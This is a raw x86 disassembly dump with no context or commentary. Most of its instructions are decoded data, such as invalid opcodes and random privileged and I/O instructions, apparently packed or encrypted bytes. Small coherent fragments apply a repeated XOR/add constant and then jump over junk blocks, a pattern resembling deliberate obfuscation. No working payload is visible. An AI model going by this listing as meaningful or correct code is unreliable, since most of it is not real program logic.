  40cf42:	fisubr WORD PTR [eax+edx*2+0x5263505b]
  40cf49:	hlt    
  40cf4a:	pop    esp
  40cf4b:	(bad)  
  40cf4d:	ror    BYTE PTR [edx-0x57],0xe5
  40cf51:	ds xor al,0x77
  40cf54:	add    ecx,DWORD PTR [edi+ebx*2-0x73]
  40cf58:	inc    ecx
  40cf59:	ret    0xa4b
  40cf5c:	je     0x40cf22
  40cf5e:	xchg   ecx,eax
  40cf5f:	ret    0x2457
  40cf62:	or     esp,DWORD PTR [eax+0x7dbfa11b]
  40cf68:	sti    
  40cf69:	jl     0x40cfaf
  40cf6b:	mov    ebp,0x8a4e9f8
  40cf70:	lea    esi,[ebp+0x4095c4e4]
  40cf76:	in     al,dx
  40cf77:	pop    ebp
  40cf78:	test   eax,0xdcfc1f44
  40cf7d:	daa    
  40cf7e:	push   cs
  40cf7f:	mov    cs,WORD PTR [esi+0x2fa90534]
  40cf85:	popf   
  40cf86:	loopne 0x40cf26
  40cf88:	push   ds
  40cf89:	out    dx,eax
  40cf8a:	pop    ebp
  40cf8b:	iret   
  40cf8c:	pop    esi
  40cf8d:	push   ebp
  40cf8e:	adc    DWORD PTR [edi-0x13cab12],0x4
  40cf95:	inc    ebp
  40cf96:	inc    ebx
  40cf97:	icebp  
  40cf98:	xor    bh,dl
  40cf9a:	jmp    0x40cfb6
  40cf9c:	mov    ax,0x33d0
  40cfa0:	shr    BYTE PTR [eax+0x62],cl
  40cfa3:	in     eax,0x89
  40cfa5:	inc    ebp
  40cfa6:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	or     BYTE PTR [ebp-0x76b38515],dh
  40cfce:	jle    0x40d04e
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cf7f
  40cfd5:	push   ecx
  40cfd6:	dec    eax
  40cfd7:	adc    bp,WORD PTR [edi-0x5d]
  40cfdb:	test   BYTE PTR [ebx+0x22f4845a],al
  40cfe1:	imul   esp,edx,0x5d596747
  40cfe7:	mov    ecx,0xa5c01d43
  40cfec:	int3   
  40cfed:	lds    esp,FWORD PTR [esi+0x3fe9eb68]
  40cff3:	inc    ecx
  40cff4:	mov    esp,0x4fbbd567
  40cff9:	cli    
  40cffa:	sti    
  40cffb:	cmp    DWORD PTR ds:0x56920f31,ebp
  40d001:	sub    BYTE PTR [edi-0x12],al
  40d004:	lods   eax,DWORD PTR ds:[esi]
  40d005:	pop    ss
  40d006:	call   0x3e22344e
  40d00b:	shl    DWORD PTR [ebx],0x8e
  40d00e:	sti    
  40d00f:	std    
  40d010:	adc    ebx,DWORD PTR [ebx]
  40d012:	mov    dh,0xec
  40d014:	inc    eax
  40d015:	add    bl,al
  40d017:	mov    ss,WORD PTR [edi+eax*2]
  40d01a:	add    BYTE PTR [ebx+0x652f8c21],ah
  40d020:	xchg   esi,eax
  40d021:	fcomp  DWORD PTR [ebx+0x1083e2d3]
  40d027:	rcr    cl,1
  40d029:	cmp    esp,DWORD PTR [ebp-0x17]
  40d02c:	aas    
  40d02d:	aad    0xa1
  40d02f:	test   BYTE PTR [eax+edi*2-0x38],dh
  40d033:	aam    0x57
  40d035:	imul   ecx,DWORD PTR [ecx+edi*2+0x13],0xf65db60f
  40d03d:	ret    
  40d03e:	fldenv [edx]
  40d040:	sbb    cl,al
  40d042:	dec    esp
  40d043:	push   esp
  40d044:	sbb    BYTE PTR [ecx],al
  40d046:	add    BYTE PTR [edx+0xa],0x91
  40d04a:	pushf  
  40d04b:	popf   
  40d04c:	(bad)  
  40d04d:	nop
  40d04e:	push   esp
  40d04f:	in     al,0x20
  40d051:	mov    al,ds:0xe5d622eb
  40d056:	mov    eax,ds:0x20ae8f7a
  40d05b:	or     eax,0x18f40021
  40d060:	sbb    DWORD PTR [esi+0x4f],eax
  40d063:	xor    BYTE PTR [ebx+0x5ffddb15],al
  40d069:	xchg   ecx,eax
  40d06a:	retf   
  40d06b:	mov    ah,0x4a
  40d06d:	dec    edi
  40d06e:	inc    edx
  40d06f:	leave  
  40d070:	cld    
  40d071:	js     0x40d03d
  40d073:	adc    al,0x60
  40d075:	dec    ebp
  40d076:	push   es
  40d077:	sub    eax,0x266c1250
  40d07c:	jecxz  0x40d0f3
  40d07e:	xchg   edi,eax
  40d07f:	ret    0x4969
  40d082:	js     0x40d011
  40d084:	sub    BYTE PTR [eax],bh
  40d086:	ja     0x40d02b
  40d088:	cld    
  40d089:	rcr    bl,cl
  40d08b:	push   ebx
  40d08c:	push   es
  40d08d:	test   BYTE PTR [ebx],ah
  40d08f:	inc    esp
  40d090:	xor    BYTE PTR [eax+0x4ca2fd38],ah
  40d096:	leave  
  40d097:	pop    es
  40d098:	inc    ch
  40d09a:	add    BYTE PTR ds:0xb77e210e,al
  40d0a0:	mov    ebp,ebx
  40d0a2:	fild   QWORD PTR [eax]
  40d0a4:	sub    ah,0x8
  40d0a7:	ret    
  40d0a8:	out    dx,eax
  40d0a9:	aam    0xcd
  40d0ab:	(bad)  
  40d0ac:	rcl    DWORD PTR [edi+eax*8+0x13],1
  40d0b0:	xor    dl,BYTE PTR [esi+ebp*4]
  40d0b3:	dec    ebp
  40d0b4:	pop    edx
  40d0b5:	dec    edi
  40d0b6:	sub    ah,ch
  40d0b8:	mov    esi,0xcbf3b811
  40d0bd:	push   esi
  40d0be:	inc    ecx
  40d0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0c0:	scas   al,BYTE PTR es:[edi]
  40d0c1:	rcl    DWORD PTR [ecx+ebx*4],1
  40d0c4:	test   al,0x8d
  40d0c6:	mov    eax,ds:0xdf39cfdf
  40d0cb:	push   edx
  40d0cc:	dec    ebx
  40d0cd:	push   ds
  40d0ce:	xchg   ecx,eax
  40d0cf:	and    al,BYTE PTR [esi+ebx*4]
  40d0d2:	mov    cs,WORD PTR [esi]
  40d0d4:	cmc    
  40d0d5:	jnp    0x40d13f
  40d0d7:	sub    eax,0x976981c9
  40d0dc:	pushf  
  40d0dd:	test   cl,dl
  40d0df:	addr16 pop ebp
  40d0e1:	repnz pop es
  40d0e3:	push   eax
  40d0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0e5:	adc    eax,0xdf3f3c91
  40d0ea:	scas   al,BYTE PTR es:[edi]
  40d0eb:	mov    eax,ds:0xa694b52
  40d0f0:	push   cs
  40d0f1:	or     al,ch
  40d0f3:	add    al,0xc5
  40d0f5:	js     0x40d0a2
  40d0f7:	pushf  
  40d0f8:	push   0x67e11f84
  40d0fd:	in     eax,dx
  40d0fe:	lds    eax,FWORD PTR [edx-0x7b]
  40d101:	lods   al,BYTE PTR ds:[esi]
  40d102:	inc    eax
  40d103:	mov    bh,0x7
  40d105:	int3   
  40d106:	shl    DWORD PTR ds:0xea0f504f,1
  40d10c:	sub    bl,BYTE PTR [eax]
  40d10e:	inc    edi
  40d10f:	dec    ebx
  40d110:	sbb    DWORD PTR [ecx+0x333e4722],ebp
  40d116:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d11c:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d122:	enter  0x840f,0xe9
  40d126:	add    eax,0x7d8b0000
  40d12b:	call   0x8b4916bb
  40d130:	push   ebp
  40d131:	adc    al,0x8b
  40d133:	inc    esp
  40d134:	add    BYTE PTR [ecx+edi*4],0x56
  40d138:	or     BYTE PTR [ecx+0x7],dl
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	cmp    BYTE PTR [ecx+ebp*4-0x38],0x9f
  40d162:	or     eax,0x3f7e7e8b
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d17a
  40d16b:	lods   eax,DWORD PTR ds:[esi]
  40d16c:	sar    BYTE PTR cs:[ebp-0x5cf001b3],cl
  40d173:	sub    dl,BYTE PTR [ebx-0x5c0d1f03]
  40d179:	xchg   edi,eax
  40d17a:	mov    cl,0x2c
  40d17c:	into   
  40d17d:	outs   dx,BYTE PTR ds:[esi]
  40d17e:	and    al,bl
  40d180:	into   
  40d181:	ins    BYTE PTR es:[edi],dx
  40d182:	int3   
  40d183:	fisttp QWORD PTR [edi+0x37]
  40d186:	and    eax,0x4415e08c
  40d18b:	sub    BYTE PTR [ebp+0x3fb9f221],cl
  40d191:	push   edx
  40d192:	mov    bh,0x17
  40d194:	nop
  40d195:	jmp    0xf0914416
  40d19a:	add    cl,BYTE PTR [eax-0x24926e61]
  40d1a0:	mov    edx,ecx
  40d1a2:	sti    
  40d1a3:	sar    ch,1
  40d1a5:	imul   ebp,DWORD PTR [eax],0x3d0bbbbd
  40d1ab:	push   0xffffffd9
  40d1ad:	aaa    
  40d1ae:	sub    BYTE PTR [ebp+0x3c4d282],0x20
  40d1b5:	sbb    al,BYTE PTR [edx]
  40d1b7:	mov    ah,0x3c
  40d1b9:	mov    edi,edi
  40d1bb:	or     bl,BYTE PTR [ebx-0x2a]
  40d1be:	jecxz  0x40d146
  40d1c0:	add    al,0x3f
  40d1c2:	dec    ebx
  40d1c3:	pushf  
  40d1c4:	out    dx,al
  40d1c5:	(bad)
  40d1c8:	add    cl,BYTE PTR [esi+0x215408b1]
  40d1ce:	bound  ebp,QWORD PTR [ebp-0x7f]
  40d1d1:	faddp  st(2),st
  40d1d3:	mov    dh,0x74
  40d1d5:	jo     0x40d174
  40d1d7:	test   BYTE PTR [esi+0x5c4ef26d],ah
  40d1dd:	dec    edi
  40d1de:	jne    0x40d222
  40d1e0:	cmp    edx,0x103bd816
  40d1e6:	(bad)  
  40d1e7:	jecxz  0x40d232
  40d1e9:	xchg   edx,eax
  40d1ea:	int3   
  40d1eb:	into   
  40d1ec:	push   edi
  40d1ed:	(bad)  
  40d1ef:	mov    ebp,0xe2eb08e3
  40d1f4:	xor    eax,0xf6803923
  40d1f9:	fdivrp st(5),st
  40d1fb:	fs add al,0xaf
  40d1fe:	push   ds
  40d1ff:	pop    ecx
  40d200:	mov    ebx,0x593e107e
  40d205:	mov    ds:0xf1d3ea22,eax
  40d20a:	jo     0x40d1bd
  40d20c:	push   eax
  40d20d:	mov    bh,0xd5
  40d20f:	lods   al,BYTE PTR ds:[esi]
  40d210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d211:	pop    esi
  40d212:	cmp    bl,BYTE PTR [esi-0x73ba1e4e]
  40d218:	pop    eax
  40d219:	xchg   DWORD PTR ds:0x1b69d67a,ebx
  40d21f:	js     0x40d1c4
  40d221:	pop    ecx
  40d222:	push   esi
  40d223:	xor    BYTE PTR [edi],bl
  40d225:	fwait
  40d226:	div    DWORD PTR [esi-0x375acd91]
  40d22c:	ins    DWORD PTR es:[edi],dx
  40d22d:	in     al,dx
  40d22e:	pop    ebp
  40d22f:	not    DWORD PTR [ebx+0x29]
  40d232:	in     al,0x58
  40d234:	and    BYTE PTR [edx+0x33e4e35b],ah
  40d23a:	pop    es
  40d23b:	jle    0x40d1e8
  40d23d:	jbe    0x40d1ea
  40d23f:	fmul   QWORD PTR fs:[edx]
  40d242:	push   0xf7c76cac
  40d247:	dec    eax
  40d248:	sbb    DWORD PTR [ebx+eax*1+0x2b],esi
  40d24c:	push   edi
  40d24d:	push   eax
  40d24e:	or     eax,0x8b7d0ab5
  40d253:	adc    BYTE PTR [edx],cl
  40d255:	xchg   edx,eax
  40d256:	xor    ecx,ecx
  40d258:	jg     0x40d1ea
  40d25a:	mov    al,ds:0x5c33bc73
  40d25f:	sbb    eax,0xf3e571e5
  40d264:	push   esi
  40d265:	je     0x40d229
  40d267:	(bad)
  40d26b:	pop    ecx
  40d26c:	cs ret 0xdb7e
  40d270:	outs   dx,BYTE PTR ds:[esi]
  40d271:	sub    ch,BYTE PTR [ebx-0x435ea0cd]
  40d277:	jne    0x40d290
  40d279:	mov    eax,ds:0x22754428
  40d27e:	mov    ch,0x66
  40d280:	xor    DWORD PTR [edi+0x967b9ae],esi
  40d286:	pop    ds
  40d287:	jnp    0x40d25a
  40d289:	jne    0x40d20e
  40d28b:	test   DWORD PTR [edi],0xeaa432c3
  40d291:	xchg   DWORD PTR [ecx],esi
  40d293:	and    edi,DWORD PTR [eax+0x72ae7b0a]
  40d299:	aas    
  40d29a:	cwde   
  40d29b:	cld    
  40d29c:	push   eax
  40d29d:	into   
  40d29e:	push   ax
  40d2a0:	pop    ss
  40d2a1:	jecxz  0x40d283
  40d2a3:	mov    eax,DWORD PTR [ebp-0x6b02ed87]
  40d2a9:	int    0x8f
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	inc    ebx
  40d2e2:	mov    ah,ah
  40d2e4:	xchg   esi,ecx
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d353
  40d2ee:	sub    DWORD PTR [eax+0xc393bc0],0x6f
  40d2f5:	push   edi
  40d2f6:	(bad)  
  40d2f8:	xor    esp,DWORD PTR [esi+ecx*4]
  40d2fb:	and    BYTE PTR [edx+eiz*2-0x54837792],al
  40d302:	outs   dx,DWORD PTR ds:[esi]
  40d303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d304:	scas   al,BYTE PTR es:[edi]
  40d305:	ss in  al,dx
  40d307:	mov    edx,0x5a9245b5
  40d30c:	jae    0x40d31c
  40d30e:	or     ah,BYTE PTR [eax]
  40d310:	ds retf 
  40d312:	jae    0x40d2b4
  40d314:	fimul  DWORD PTR [ecx-0x17]
  40d317:	imul   esi,DWORD PTR [edx],0x24d50c07
  40d31d:	cwde   
  40d31e:	lds    ebx,FWORD PTR [eax+0x6f]
  40d321:	mov    ah,0x5c
  40d323:	(bad)  
  40d324:	daa    
  40d325:	add    al,ah
  40d327:	and    al,0x16
  40d329:	lods   eax,DWORD PTR ds:[esi]
  40d32a:	push   ecx
  40d32b:	adc    eax,0x84fb3723
  40d330:	int    0x73
  40d332:	and    eax,0x5e39ae56
  40d337:	dec    edi
  40d338:	xchg   BYTE PTR [edi+0x6d975e2f],dh
  40d33e:	in     al,0x52
  40d340:	dec    ebx
  40d341:	outs   dx,BYTE PTR ds:[esi]
  40d342:	or     eax,ebp
  40d344:	fwait
  40d345:	lods   al,BYTE PTR ds:[esi]
  40d346:	mov    ecx,0x67ec0f68
  40d34b:	int    0x92
  40d34d:	push   esi
  40d34e:	jg     0x40d3aa
  40d350:	in     al,dx
  40d351:	aas    
  40d352:	sar    dh,cl
  40d354:	sub    DWORD PTR [ebp-0x23],ebx
  40d357:	dec    edx
  40d358:	xor    ebp,eax
  40d35a:	mov    edx,0x5a98f0c2
  40d35f:	xchg   ah,bl
  40d361:	mov    DWORD PTR [eax],edi
  40d363:	mov    edi,0xc6328df3
  40d368:	ret    
  40d369:	hlt    
  40d36a:	lea    esi,es:[esi+0x6d]
  40d36e:	add    eax,0xd74c98c7
  40d373:	repz aam 0x56
  40d376:	fild   WORD PTR [edi]
  40d378:	mov    cl,0x2c
  40d37a:	adc    cl,BYTE PTR [edx+0x23]
  40d37d:	jle    0x40d3c0
  40d37f:	icebp  
  40d380:	mov    ecx,0x9fbd28e3
  40d385:	pusha  
  40d386:	mov    edi,0x5d0fde1b
  40d38b:	jmp    0x8fe:0x765fcb49
  40d392:	add    eax,0x6cb743d1
  40d397:	lods   al,BYTE PTR ds:[esi]
  40d398:	pop    ebx
  40d399:	jb     0x40d395
  40d39b:	dec    edx
  40d39c:	jecxz  0x40d336
  40d39e:	pop    ebp
  40d39f:	xor    al,bh
  40d3a1:	jae    0x40d33f
  40d3a3:	cmp    cl,ah
  40d3a5:	sbb    cl,BYTE PTR cs:[edx-0x15]
  40d3a9:	imul   BYTE PTR [ebp-0x60]
  40d3ac:	jae    0x40d3fd
  40d3ae:	add    eax,0xf8c53496
  40d3b3:	adc    BYTE PTR [esi],al
  40d3b5:	inc    esp
  40d3b6:	iret   
  40d3b7:	fsub   st,st(3)
  40d3b9:	xor    ebp,DWORD PTR [ebx+0x771e29c1]
  40d3bf:	mov    eax,ds:0xc87a17ec
  40d3c4:	jo     0x40d3b7
  40d3c6:	mov    eax,ds:0xba3e870
  40d3cb:	nop
  40d3cc:	(bad)  
  40d3cd:	xlat   BYTE PTR ds:[ebx]
  40d3ce:	inc    ecx
  40d3cf:	jb     0x40d398
  40d3d1:	mov    cl,0x3c
  40d3d3:	les    esp,FWORD PTR [ecx]
  40d3d5:	xor    edi,DWORD PTR ds:0x91cdee63
  40d3db:	sub    eax,DWORD PTR [ebx]
  40d3dd:	cdq    
  40d3de:	cmc    
  40d3df:	pop    ecx
  40d3e0:	in     eax,0x9d
  40d3e2:	add    al,0xb5
  40d3e4:	enter  0x23ce,0xa1
  40d3e8:	and    DWORD PTR ds:0x144593a5,0xffffffdd
  40d3ef:	inc    eax
  40d3f0:	ins    BYTE PTR es:[edi],dx
  40d3f1:	xchg   ebx,eax
  40d3f2:	mov    ecx,0xbe15a464
  40d3f7:	popf   
  40d3f8:	shl    DWORD PTR [esi+0x2f],cl
  40d3fb:	add    ch,BYTE PTR [ebx]
  40d3fd:	push   esi
  40d3fe:	pushf  
  40d3ff:	adc    BYTE PTR [ebx*2+0x2fb7f22a],bl
  40d406:	and    bh,bh
  40d408:	aas    
  40d409:	call   0xdb58:0xf073cd0b
  40d410:	cmp    ebx,DWORD PTR [ebx-0xb]
  40d413:	adc    al,0x90
  40d415:	mov    ?,WORD PTR [esp+edx*2+0x3b]
  40d419:	enter  0x46b3,0x2e
  40d41d:	test   al,0x47
  40d41f:	js     0x40d472
  40d421:	dec    esp
  40d422:	call   0x3340037c
  40d427:	jnp    0x40d43a
  40d429:	mov    DWORD PTR [ecx],esi
  40d42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d42c:	xor    eax,0x14558b78
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	or     al,0x94
  40d44b:	inc    ecx
  40d44c:	nop
  40d44d:	(bad)  
  40d44e:	lea    edi,[esi+0x7e]
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d43c
  40d456:	cmp    al,0xbd
  40d458:	and    ecx,DWORD PTR gs:[esi]
  40d45b:	inc    edx
  40d45c:	mov    eax,ds:0x43edde64
  40d461:	push   eax
  40d462:	jg     0x40d4d9
  40d464:	adc    ecx,DWORD PTR [ebx]
  40d466:	or     BYTE PTR [esi],0x38
  40d469:	in     eax,dx
  40d46a:	fldenv [edi+ebp*2+0x5c]
  40d46e:	lds    ebp,FWORD PTR [ebp+0x2e14ea23]
  40d474:	std    
  40d475:	inc    edx
  40d476:	dec    ecx
  40d477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d478:	inc    BYTE PTR [eax+0x2a]
  40d47b:	cmp    al,0x9
  40d47d:	aaa    
  40d47e:	adc    eax,0x39d7395
  40d483:	call   0xcd5e899b
  40d488:	retf   0xbec9
  40d48b:	imul   eax,edi,0xffffffd2
  40d48e:	or     eax,DWORD PTR [ebx+0x7b7770e6]
  40d494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d495:	cmp    al,0x8a
  40d497:	and    al,0xb
  40d499:	ror    BYTE PTR [ecx],1
  40d49b:	mov    edx,0x73211a20
  40d4a0:	pop    ecx
  40d4a1:	je     0x40d462
  40d4a3:	fsubr  st(5),st
  40d4a5:	xor    al,0xc8
  40d4a7:	in     eax,0x1
  40d4a9:	sbb    BYTE PTR [edx],al
  40d4ab:	(bad)  
  40d4ac:	cmp    BYTE PTR [ecx+esi*2],bl
  40d4af:	mov    cl,0x45
  40d4b1:	(bad)  
  40d4b2:	jo     0x40d476
  40d4b4:	pop    es
  40d4b5:	push   cs
  40d4b6:	mov    dl,cl
  40d4b8:	aam    0x7c
  40d4ba:	jecxz  0x40d483
  40d4bc:	jmp    0x201f:0xe0392c5d
  40d4c3:	push   eax
  40d4c4:	cmp    eax,0xea8d0f19
  40d4c9:	mov    WORD PTR [esi],cs
  40d4cb:	shl    DWORD PTR [eax],cl
  40d4cd:	pushf  
  40d4ce:	repz push ecx
  40d4d0:	jge    0x40d4e2
  40d4d2:	mov    esi,0xe1dbf9a7
  40d4d7:	stc    
  40d4d8:	pop    esp
  40d4d9:	pop    ss
  40d4da:	popf   
  40d4db:	addr16 jne 0x40d470
  40d4de:	scas   eax,DWORD PTR es:[edi]
  40d4df:	dec    ecx
  40d4e0:	mov    esp,0x409f635d
  40d4e5:	mov    DWORD PTR [ebx-0x5d421828],edi
  40d4eb:	adc    al,0xc2
  40d4ed:	xchg   ebp,eax
  40d4ee:	ret    
  40d4ef:	bound  ecx,QWORD PTR [ebp-0x61c85de7]
  40d4f5:	mul    BYTE PTR [esi+ebp*2]
  40d4f8:	sub    bh,BYTE PTR [edx-0x2830813a]
  40d4fe:	xor    DWORD PTR [ecx],esp
  40d500:	fucomi st,st(7)
  40d502:	mov    ebx,0xad68fa04
  40d507:	neg    edi
  40d509:	add    ebx,esp
  40d50b:	push   edx
  40d50c:	inc    ebp
  40d50d:	not    DWORD PTR [ecx+eiz*1]
  40d510:	add    edx,esp
  40d512:	inc    ebx
  40d513:	in     al,dx
  40d514:	mov    ds:0xaeff3eb2,al
  40d519:	push   ds
  40d51a:	(bad)  
  40d51b:	or     bl,BYTE PTR [edi+eiz*1]
  40d51e:	xchg   edi,eax
  40d51f:	sahf   
  40d520:	cmp    BYTE PTR [eax+0x7fc57d44],ah
  40d526:	test   eax,0x4e904c07
  40d52b:	push   cs
  40d52c:	adc    esi,DWORD PTR [ebx-0x4f]
  40d52f:	push   0x9c83c77e
  40d534:	mov    edi,0x1e8fc673
  40d539:	popa   
  40d53a:	loope  0x40d543
  40d53c:	rcr    BYTE PTR [ebx+0x54],cl
  40d53f:	cmp    cl,ah
  40d541:	cmp    dh,bl
  40d543:	lock scas eax,DWORD PTR es:[edi]
  40d545:	pushf  
  40d546:	leave  
  40d547:	sahf   
  40d548:	fcomip st,st(0)
  40d54a:	mov    BYTE PTR [ebx+eiz*2-0x13be246c],al
  40d551:	sbb    BYTE PTR [ecx+0x4e],al
  40d554:	cmc    
  40d555:	adc    eax,0x382ad400
  40d55a:	xor    BYTE PTR [esi-0x7be40c21],bl
  40d560:	cmp    ebp,DWORD PTR [eax]
  40d562:	sbb    dh,BYTE PTR [ebp-0x9]
  40d565:	scas   al,BYTE PTR es:[edi]
  40d566:	push   ecx
  40d567:	or     DWORD PTR [edx],edx
  40d569:	push   esi
  40d56a:	hlt    
  40d56b:	sub    al,0x46
  40d56d:	push   cs
  40d56e:	jmp    0x40d51d
  40d570:	popa   
  40d571:	jae    0x40d529
  40d573:	adc    al,0xe8
  40d575:	icebp  
  40d576:	call   0xc75e1390
  40d57b:	xlat   BYTE PTR ds:[ebx]
  40d57c:	shr    BYTE PTR [eax],1
  40d57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d57f:	test   eax,0xfbb644fe
  40d584:	mov    dl,0x16
  40d586:	mov    dh,0x20
  40d588:	call   0xda9126bf
  40d58d:	pusha  
  40d58e:	inc    eax
  40d58f:	jae    0x40d520
  40d591:	cmc    
  40d592:	test   al,0xc0
  40d594:	pop    es
  40d595:	cmp    ecx,DWORD PTR [ebx+0x59e9fc55]
  40d59b:	add    DWORD PTR [eax],eax
  40d59d:	add    bh,ah
  40d59f:	idiv   DWORD PTR [edx]
  40d5a1:	push   ss
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xa949fe4c
  40d5ac:	mov    ds:0x7e8e40e8,al
  40d5b1:	jle    0x40d5f2
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d626
  40d5b7:	dec    edx
  40d5b8:	sub    eax,0x2cb8814c
  40d5bd:	sbb    ch,BYTE PTR [ebp-0x11]
  40d5c0:	int3   
  40d5c1:	(bad)  
  40d5c2:	aam    0x53
  40d5c4:	bound  esp,QWORD PTR [esp+ebp*2]
  40d5c7:	mov    ebp,0xdbf02c09
  40d5cc:	dec    ecx
  40d5cd:	push   0x2b
  40d5cf:	pushf  
  40d5d0:	repz and eax,0x38efb011
  40d5d6:	push   esp
  40d5d7:	shl    BYTE PTR [ebx-0x15],0xb8
  40d5db:	mov    esi,0x4edbea75
  40d5e0:	pop    ds
  40d5e1:	jo     0x40d5d0
  40d5e3:	loopne 0x40d565
  40d5e5:	dec    eax
  40d5e6:	retf   0xb042
  40d5e9:	sbb    ch,dl
  40d5eb:	adc    ch,BYTE PTR [ecx-0x4e]
  40d5ee:	xchg   DWORD PTR [ecx],edx
  40d5f0:	and    DWORD PTR [eax+0x7d],esi
  40d5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f4:	or     DWORD PTR [esi+0x10c11eb0],0x150f0e9d
  40d5fe:	or     DWORD PTR [ecx+ebp*1+0x5b83dad2],edi
  40d605:	and    BYTE PTR [ebp-0x6e0da762],ah
  40d60b:	sbb    edi,0x73
  40d60e:	jnp    0x40d5aa
  40d610:	pop    esi
  40d611:	aad    0xb0
  40d613:	fisub  WORD PTR [edi]
  40d615:	cs ins BYTE PTR es:[edi],dx
  40d617:	in     al,dx
  40d618:	scas   eax,DWORD PTR es:[edi]
  40d619:	sub    esi,DWORD PTR [ebp+ebp*2-0x3e1abfba]
  40d620:	xor    BYTE PTR [ecx-0x3a],ch
  40d623:	call   0xd2d2:0xd8d011b6
  40d62a:	inc    ebp
  40d62b:	push   0x2c1cbc8e
  40d630:	inc    edi
  40d631:	push   esp
  40d632:	sub    DWORD PTR es:[eax-0x6f],0xfffffffd
  40d637:	sbb    BYTE PTR [eax-0x51],bh
  40d63a:	mov    BYTE PTR [ecx+0x7a],ah
  40d63d:	dec    esp
  40d63e:	lea    ecx,[esi-0x42825e93]
  40d644:	enter  0x2b1c,0x79
  40d648:	test   eax,0xe8ad158e
  40d64d:	push   ecx
  40d64e:	and    ch,BYTE PTR [ebx+0x21]
  40d651:	cmp    ch,BYTE PTR [ecx-0x1c]
  40d654:	rcr    BYTE PTR [ebx-0x75bac429],cl
  40d65a:	fadd   QWORD PTR [ebx]
  40d65c:	fwait
  40d65d:	sub    ah,ah
  40d65f:	popa   
  40d660:	imul   ecx,edx,0x8
  40d663:	es pop ebx
  40d665:	repz cs cld 
  40d668:	std    
  40d669:	loope  0x40d6be
  40d66b:	jp     0x40d63b
  40d66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d66e:	sbb    dh,BYTE PTR [ecx-0x5288036]
  40d674:	shl    BYTE PTR [edx],0x5d
  40d677:	add    dh,dl
  40d679:	add    bh,BYTE PTR [edx]
  40d67b:	imul   ebx,DWORD PTR [ebp+0x5cedfb40],0xa5b467d7
  40d685:	dec    esi
  40d686:	(bad)  
  40d687:	fcmovnbe st,st(0)
  40d689:	sub    BYTE PTR [edi+0x13],0x43
  40d68d:	push   ebp
  40d68e:	mov    esi,0x37055409
  40d693:	arpl   WORD PTR [ebp+0x63],di
  40d696:	cmp    eax,0x3f6ba76d
  40d69b:	sub    dh,bl
  40d69d:	leave  
  40d69e:	sbb    bh,cl
  40d6a0:	sub    al,dl
  40d6a2:	cs out 0x8c,eax
  40d6a5:	sbb    bh,al
  40d6a7:	inc    edx
  40d6a8:	in     al,dx
  40d6a9:	rol    bl,1
  40d6ab:	or     DWORD PTR [eax],ebx
  40d6ad:	(bad)  
  40d6ae:	sbb    eax,0xda28a6a9
  40d6b3:	cwde   
  40d6b4:	adc    ebx,DWORD PTR [esi+0x7725642a]
  40d6ba:	sub    ebx,DWORD PTR [ecx+0x36]
  40d6bd:	adc    esp,DWORD PTR [edi-0x3dc4ca96]
  40d6c3:	mov    edi,0x248396b0
  40d6c8:	(bad)  
  40d6c9:	out    0x61,al
  40d6cb:	cld    
  40d6cc:	dec    eax
  40d6cd:	cli    
  40d6ce:	sar    BYTE PTR [edx-0x48],cl
  40d6d1:	test   eax,0x569bffee
